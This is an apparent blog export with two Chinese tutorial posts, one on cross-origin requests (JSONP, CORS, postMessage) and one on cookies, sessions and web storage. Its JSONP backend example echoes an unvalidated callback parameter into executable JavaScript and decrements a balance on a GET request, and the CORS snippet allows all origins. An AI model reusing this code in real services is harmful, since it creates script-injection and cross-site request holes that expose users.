    <content type="text"><![CDATA[形式有三种：JSONP、CORS、postMessage JSONP（JSON+padding）在页面中，通过script标签加载数据的方式，将数据当作JS代码来执行，前端提前在页面上声明一个函数，函数名（回调函数）通过接口传参的方式传给后台，后台解析到函数名后在原始数据上包裹这个函数名再发送给前端，但这需要对应接口的后端配合才能实现 下面是一个模拟的过程： 请求方：frank.com 的前端程序员（浏览器） 响应方：jack.com 的后端程序员（服务器） 1、请求方创建 script 标签，src 指向响应方，同时传一个查询参数 ?callbackName=yyy 2、响应方根据查询参数callbackName，构造形如 yyy.call(undefined, ‘你要的数据’) yyy(‘你要的数据’) 这样的响应 3、浏览器接收到响应，就会执行 yyy.call(undefined, ‘你要的数据’) 4、那么请求方就知道了他要的数据 示例HTML 中 script 标签可以加载其他域下的js，比如我们经常引入一个其他域下线上cdn的jQuery1&lt;script src=&quot;http://api.jirengu.com/weather.php&quot;&gt;&lt;/script&gt; 这时候会向天气接口发送请求获取数据，获取数据后做为 js 来执行。 但这里有个问题，数据是 JSON 格式的数据，直接作为 JS 运行的话我如何去得到这个数据来操作呢？ 于是我们添加一个callback的参数1&lt;script src=&quot;http://api.jirengu.com/weather.php?callback=showData&quot;&gt;&lt;/script&gt; 这个请求到达后端后，后端会去解析callback这个参数获取到字符串showData，在发送数据做如下处理： 之前后端返回数据是： {“city”: “hangzhou”, “weather”: “晴天”} 现在后端返回数据： showData({“city”: “hangzhou”, “weather”: “晴天”}) 前端script标签在加载数据后会把 showData({“city” “hangzhou”, “weather”: “晴天”})做为 js 来执行，这实际上就是调用showData这个函数，同时参数是 {“city” “hangzhou”, “weather”: “晴天”}。 用户只需要提前在页面定义好showData这个全局函数，在函数内部处理参数即可。 123456&lt;script&gt;function showData(ret)&#123; console.log(ret);&#125;&lt;/script&gt;&lt;script src=&quot;http://api.jirengu.com/weather.php?callback=showData&quot;&gt;&lt;/script&gt; 前后端完整示例前端代码1234567891011121314151617button.addEventListener(&apos;click&apos;, (e)=&gt;&#123; let script = document.createElement(&apos;script&apos;) let functionName = &apos;frank&apos;+ parseInt(Math.random()*10000000 ,10) window[functionName] = function()&#123; // 每次请求之前搞出一个随机的函数 amount.innerText = amount.innerText- 1 &#125; script.src = &apos;/pay?callback=&apos; + functionName document.body.appendChild(script) script.onload = function(e)&#123; // 状态码是 200~299 则表示成功 e.currentTarget.remove() delete window[functionName] // 请求完了就干掉这个随机函数 &#125; script.onerror = function(e)&#123; // 状态码大于等于 400 则表示失败 e.currentTarget.remove() delete window[functionName] // 请求完了就干掉这个随机函数 &#125;&#125;) 后端代码，不用看12345678910111213...if (path === &apos;/pay&apos;)&#123; let amount = fs.readFileSync(&apos;./db&apos;, &apos;utf8&apos;) amount -= 1 fs.writeFileSync(&apos;./db&apos;, amount) let callbackName = query.callback response.setHeader(&apos;Content-Type&apos;, &apos;application/javascript&apos;) response.write(` $&#123;callbackName&#125;.call(undefined, &apos;success&apos;) `) response.end()&#125;... 为什么不支持POST因为JSONP是通过动态创建script标签实现的（script中的src属性只能写入url，而url可以写入get数据无法写入post），而动态创建script只能用GET不能用POST。 jQuery的写法1234567891011121314$(Button).on(&apos;click&apos;, function () &#123; $.ajax(&#123; url: &quot;http://jack.com:8002/pay&quot;, dataType: &quot;jsonp&quot;, success: function (response) &#123; if (response === &apos;success&apos;) &#123; // alert(&apos;前端写的代码&apos;) &#125; &#125;, error: function () &#123; alert(&apos;fail&apos;); &#125; &#125;);&#125;) CORS跨域跨源资源分享（Cross-Origin Resource Sharing），是一种ajax跨域请求资源的方式。实现方式很简单，当你使用XMLHttpRequest发送请求时，浏览器发现该请求不符合同源策略，会给该请求加一个请求头：Origin，后台进行一系列处理，如果确定接受请求则在返回结果中加入一个响应头：Access-Control-Allow-Origin; 浏览器判断该相应头中是否包含 Origin 的值，如果有则浏览器会处理响应，我们就可以拿到响应数据，如果不包含浏览器直接驳回，这时我们无法拿到响应数据。所以 CORS 的表象是让你觉得它与同源的 ajax 请求没啥区别，代码完全一样。12response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;http://jayce.com:8003&apos;)response.setHeader(&apos;Access-Control-Allow-Origin&apos;,&apos;*&apos;) // *代表允许所有浏览器访问 postMessage语法：otherWindow.postMessage(message, targetOrigin); otherWindow:指目标窗口，也就是给哪个window发消息，是 window.frames 属性的成员或者由 window.open 方法创建的窗口 message: 是要发送的消息，类型为 String、Object targetOrigin: 是限定消息接收范围，可以是*（无限制）或者一个URL 例如父窗口 http://aaa.com 向子窗口 http://bbb.com 发送消息12var popup = window.open(&apos;http://bbb.com&apos;, &apos;title&apos;);popup.postMessage(&apos;Hello World!&apos;, &apos;http://bbb.com&apos;); 子窗口向父窗口发送消息也是类似1window.opener.postMessage(&apos;Nice to see you&apos;, &apos;http://aaa.com&apos;);]]></content>
  </entry>
  <entry>
    <title><![CDATA[cookie、session及localStorge]]></title>
    <url>%2F2018%2F08%2F01%2Fcookie%E3%80%81session%E5%8F%8AlocalStorge%2F</url>
    <content type="text"><![CDATA[说说cookie和localStorage的区别吧！这个几乎每次面试都会被提一嘴的问题 cookie1、什么是cookiecookie是服务器发送到用户浏览器并保存在本地的一小块数据，用来记录某些当页面关闭或刷新后仍需记录的信息，它会在下一次浏览器向同一服务器发送请求时携带并发送给该服务器，在控制台用 document.cookie 可以查看当前正在浏览的网站cookie 要点： 服务器通过 set-cookie 头给客户端一串字符串 浏览器每次访问相同域名的页面时必须带上 cookie 作为请求头（Request-Header） cookie一般用来记录用户信息，默认在关闭页面后失效，后台代码可以设置cookie的过期时间 2、cookie用例以注册登录为例：1、注册账号时，服务器把你的用户名和密码存入数据库 2、登陆的时候，浏览器发送post请求，服务器把你的账号密码跟数据库里的做匹配，若匹配成功，则发送一个响应头给浏览器，如：1Set-Cookie: sign_in_email=xxx@xxx.com 3、这就是cookie，里面记录着你的登陆信息，浏览器会在一段时间内保存cookie 4、当你再访问相同域名的网页时，浏览器会带着这个cookie发请求，服务器会将cookie里的信息和数据库匹配，若匹配上了，则直接发送给你已经登陆上的页面 5、cookie默认在关闭页面后被清除，而后台可以设置cookie的过期时间 3、Cookie的分类浏览器所持有的cookie分为两种： Session Cookie（会话期即非持久Cookie）：是最简单的cookie，它不需要指定过期时间（expires）或是有效期（Max-Age），它仅在会话期内有效，浏览器关闭后它会被自动删除 Permanent Cookie（持久性Cookie）：可以指定过期时间或有效期 设置cookie过期时间： setMaxAge 1cookie.setMaxAge(60*60) // 过期时间为1小时 expires(不要用) 1Set-Cookie: name=Nicholas; expires=Sat, 02 May 2009 23:38:25 GMT //星期六 5月2号 2009年 23:38:25时过期 因为expires设置是根据本地时间，但各个地方时区不同设置时容易造成混乱 4、Cookie的作用： 保存用户登录状态：例如将用户ID储存在一个cookie内，这样用户在下次访问该页面的时候就不需要重新登录了，常见于很多论坛或社区，还可以设置过期时间，当超过这个期限，cookie会自动消失。因此，系统往往可以提示用户保持登录状态的时间，常见的有一个月、三个月、一年等 跟踪用户行为：例如一个天气预报网站，能根据用户选择的地区显示当地天气情况，但如果每次都需要用户选择所在地十分不人性化，当利用了cookie系统就能记住上一次访问的地区，当下次打开页面时，就会自动显示上次用户所在地区的天气情况 定制页面：如果网站提供了换肤或者更换布局的功能，使用cookie就可以记录下用户的选项，当用户下次访问时，仍然保持的是上一次设置的页面风格 cookie和session的区别HTTP是一个无状态协议，因此cookie最大的作用就是存储sessionID，用来唯一标识用户 cookie： 它是由服务器通过Set-Cookie发送给浏览器的一串字符串构成 cookie被保存在客户端，并且每次都会随请求发送给服务器 没有session之前，cookie里记录了用户信息，任何人可读可写，十分不安全 session： session是依附于cookie而存在的 服务器通过 session 给用户一个 sessionID ，sessionID 对应服务器中的一小块内存（一般是一个随机数），通过 set-cookie 添加到http响应头部中 浏览器发送请求时会带上cookie，服务器通过sessionID来识别用户 这样暴露给其他人的只有一个随机数sessionID，增加安全性 localStorage和sessionStoragelocalStorage localStorage是html5提供的一个本地存储web storage特性的API，实质上是一个哈希，有setItem、getItem、clear等属性 localStorage 与 http 无关，HTTP不会带上localStorage的值 只有相同域名的页面才能互相读取 localStorage 经常在记录某个信息有没有提示给用户时用到 localStorage 永久有效，除非用户清理缓存 sessionStorage 与 localStorage 唯一一点区别是，sessionStorage 在用户关闭页面后就会失效 localStorage与cookie的区别 cookie会随请求被发送到服务器上，但localStorage不会 cookie大小一般在4k左右，localStorage一般5MB左右（服务器不同也会有所不同）]]></content>
      <tags>
        <tag>cookie</tag>
      </tags>
  </entry>
</search>
